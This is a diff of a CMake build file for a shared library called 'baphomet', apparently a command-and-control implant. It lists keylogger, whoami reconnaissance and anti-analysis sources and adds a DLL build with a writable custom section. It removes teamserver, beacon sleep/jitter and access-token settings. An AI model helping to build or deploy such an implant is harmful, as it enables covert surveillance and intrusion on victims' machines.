@@ -5,7 +5,6 @@ set(CMAKE_CXX_STANDARD 17)
 set(MAIN_INCLUDE_DIR ${CMAKE_CURRENT_SOURCE_DIR}/include)
 
 
-# statically link to avoid dependency issues
 if(MSVC)
     add_compile_options(
             $<$<CONFIG:>:/MT>
@@ -26,6 +25,7 @@ add_library(baphomet SHARED src/main.cpp
         src/reconaissance/whoami.cpp
         src/reconaissance/keylogger.cpp
 
+        src/util/controlflow_guard.cpp
         src/util/init_config.cpp
         src/util/hash.cpp
         src/util/dispatch.cpp
@@ -62,15 +62,10 @@ add_library(baphomet SHARED src/main.cpp
         include/anti_analysis.hpp
 )
 
-#TODO: make these configs work
-target_compile_definitions(baphomet PRIVATE CFG_CALLBACK_OBJECT="-")
-target_compile_definitions(baphomet PRIVATE CFG_TEAMSERVER_ADDRESS="127.0.0.1")
-target_compile_definitions(baphomet PRIVATE CFG_TEAMSERVER_PORT=8081)
-target_compile_definitions(baphomet PRIVATE CFG_ACCESS_TOKEN="-")
-target_compile_definitions(baphomet PRIVATE CFG_USER_AGENT="-")
-target_compile_definitions(baphomet PRIVATE CFG_SLEEP_TIME=2500)
-target_compile_definitions(baphomet PRIVATE CFG_JITTER=2500)
-target_compile_definitions(baphomet PRIVATE CFG_USE_HTTPS=false)
+if(MSVC)
+    target_link_options(baphomet PRIVATE "/SECTION:.baph,RW")
+endif()
 
 target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
+target_compile_definitions(baphomet PRIVATE BAPHOMET_COMPILE_AS_DLL)
 target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})
